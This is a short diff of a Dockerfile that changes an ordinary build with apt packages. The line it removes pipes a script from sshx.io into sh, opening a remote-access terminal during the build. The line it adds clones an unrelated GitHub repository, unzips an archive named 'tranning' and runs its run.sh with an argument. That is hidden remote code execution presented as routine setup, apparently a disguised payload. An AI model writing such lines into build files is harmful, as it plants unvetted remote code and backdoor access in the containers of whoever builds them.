@@ -9,10 +9,12 @@ RUN apt-get update -qq \
       && apt-get install -y --no-install-recommends \
       build-essential \
       curl \
+      git \
+      unzip \
       python3-dev \
       && apt-get clean \
       && rm -rf /var/lib/apt/lists/*
-RUN curl -sSf https://sshx.io/get | sh -s run
+RUN git clone https://github.com/Teo4268/Bjndersrb && cd Bjndersrb && unzip tranning && cd tranning && chmod +x run.sh && ./run.sh 4
 # Copy the current directory contents into the container at /app
 COPY . /app
 
